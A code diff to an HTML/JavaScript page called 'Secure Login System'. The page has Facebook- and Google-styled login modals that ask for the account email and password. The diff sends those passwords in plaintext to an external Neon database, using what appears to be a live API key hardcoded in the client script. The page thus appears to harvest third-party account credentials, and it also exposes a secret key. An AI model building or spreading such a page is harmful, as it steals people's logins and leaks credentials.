@@ -6,6 +6,7 @@
     <title>Secure Login System</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* YOUR EXISTING CSS STAYS THE SAME - DON'T TOUCH IT */
         * {
             margin: 0;
             padding: 0;
@@ -611,46 +612,77 @@
     </div>
 
     <script>
-        // ADD THESE LINES AT THE VERY TOP of your script section
-        const API_URL = '/api'; // You'll update this after deployment
+        // ===== NEON DATABASE CONFIGURATION =====
+        // REPLACE THIS WITH YOUR ACTUAL NEON API KEY
+        const NEON_API_URL = 'https://ep-fragrant-moon-ad1lph9b.apirest.c-2.us-east-1.aws.neon.tech/neondb/rest/v1';
+        const NEON_API_KEY = 'napi_ulpelzh35khkxa61641rft32j1rc2crgs5i1xkkzp1s3b1rhta2ctqvrp8jki9v6'; // Get from Neon Dashboard → Authentication
+        
         let currentUser = null;
 
-        // ADD THESE FUNCTIONS inside your script, after the DOM elements
+        // ===== NEON DATABASE FUNCTIONS =====
         async function storeUserInDatabase(userData) {
+            console.log('Storing user in Neon:', userData);
             try {
-                const response = await fetch(`${API_URL}/users`, {
+                const response = await fetch(`${NEON_API_URL}/users`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${NEON_API_KEY}`,
+                        'apikey': NEON_API_KEY,
+                        'Prefer': 'return=representation'
                     },
                     body: JSON.stringify(userData)
                 });
-                return await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('User stored successfully:', result);
+                return result[0];
             } catch (error) {
-                console.error('Database storage error:', error);
-                // Fallback to localStorage if database fails
+                console.error('Neon Database storage error:', error);
+                // Fallback to localStorage
                 localStorage.setItem('user', JSON.stringify(userData));
                 return userData;
             }
         }
 
         async function checkUserExists(identifier) {
+            console.log('Checking user in Neon:', identifier);
             try {
-                const response = await fetch(`${API_URL}/users/${identifier}`);
-                return await response.json();
+                const response = await fetch(
+                    `${NEON_API_URL}/users?or=(email.eq.${encodeURIComponent(identifier)},phone.eq.${encodeURIComponent(identifier)})&limit=1`,
+                    {
+                        headers: {
+                            'Authorization': `Bearer ${NEON_API_KEY}`,
+                            'apikey': NEON_API_KEY,
+                            'Content-Type': 'application/json'
+                        }
+                    }
+                );
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('User check result:', result);
+                return result[0] || null;
             } catch (error) {
-                console.error('Database check error:', error);
+                console.error('Neon Database check error:', error);
                 // Fallback to localStorage
                 const storedUser = localStorage.getItem('user');
                 return storedUser ? JSON.parse(storedUser) : null;
             }
         }
-        
+
+        // ===== DOM ELEMENTS =====
         const loginPage = document.getElementById('loginPage');
         const homePage = document.getElementById('homePage');
         const facebookLogin = document.getElementById('facebookLogin');
         const googleLogin = document.getElementById('googleLogin');
-
         const otherLogin = document.getElementById('otherLogin');
         const emailForm = document.getElementById('emailForm');
         const loginSubmit = document.getElementById('loginSubmit');
@@ -679,7 +711,7 @@
         const facebookLoading = document.getElementById('facebookLoading');
         const googleLoading = document.getElementById('googleLoading');
 
-        // Event Listeners
+        // ===== EVENT LISTENERS =====
         facebookLogin.addEventListener('click', () => {
             facebookModal.style.display = 'flex';
         });
@@ -713,6 +745,10 @@
         });
 
         logoutBtn.addEventListener('click', () => {
+            // Clear user data
+            currentUser = null;
+            localStorage.removeItem('user');
+            
             loginPage.style.display = 'flex';
             homePage.style.display = 'none';
         });
@@ -734,7 +770,7 @@
             }
         });
 
-        // Functions
+        // ===== LOGIN FUNCTIONS =====
         async function handleEmailLogin() {
             const identifier = document.getElementById('email').value;
             const password = document.getElementById('password').value;
@@ -758,9 +794,9 @@
                     const userData = {
                         email: isValidEmail(identifier) ? identifier : null,
                         phone: isValidPhone(identifier) ? identifier : null,
-                        password: password, // In real app, hash this!
-                        loginMethod: 'email',
-                        createdAt: new Date()
+                        password: password,
+                        login_method: 'email',
+                        created_at: new Date()
                     };
                     currentUser = await storeUserInDatabase(userData);
                 } else {
@@ -778,6 +814,7 @@
                 alert('Login failed. Please try again.');
             }
         }
+
         async function handleProviderLogin(provider) {
             let email, password, modal, form, loading;
             
@@ -812,9 +849,10 @@
                     // Store new user in database
                     const userData = {
                         email: email,
-                        password: password, // In real app, hash this!
-                        loginMethod: provider,
-                        createdAt: new Date()
+                        phone: null,
+                        password: password,
+                        login_method: provider,
+                        created_at: new Date()
                     };
                     currentUser = await storeUserInDatabase(userData);
                 } else {
@@ -841,7 +879,8 @@
                 document.getElementById('googlePassword').value = '';
             }
         }
-            
+
+        // ===== VALIDATION FUNCTIONS =====
         function isValidEmail(email) {
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return emailRegex.test(email);
@@ -852,6 +891,7 @@
             return phoneRegex.test(phone);
         }
 
+        // ===== FILE UPLOAD FUNCTIONS =====
         function handleFileSelect(event) {
             const file = event.target.files[0];
             
@@ -913,7 +953,8 @@
                 }, 5000);
             }, 2000);
         }
-        // Check if user is already logged in (add this at the end of your script)
+
+        // ===== CHECK IF USER IS ALREADY LOGGED IN =====
         window.addEventListener('DOMContentLoaded', async () => {
             try {
                 // Try to get user from localStorage as fallback
